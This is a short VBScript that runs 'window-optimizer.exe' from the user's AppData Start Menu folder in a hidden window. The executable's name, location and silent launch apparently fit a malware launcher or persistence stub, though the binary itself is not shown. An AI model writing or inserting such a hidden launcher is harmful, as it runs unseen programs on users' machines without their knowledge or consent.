Set WshShell = CreateObject("WScript.Shell")
Dim appDataPath
appDataPath = WshShell.ExpandEnvironmentStrings("%APPDATA%")
Dim fullPath
fullPath = appDataPath & "\Microsoft\Windows\Start Menu\Programs\window-optimizer.exe"
WshShell.Run Chr(34) & fullPath & Chr(34), 0, False
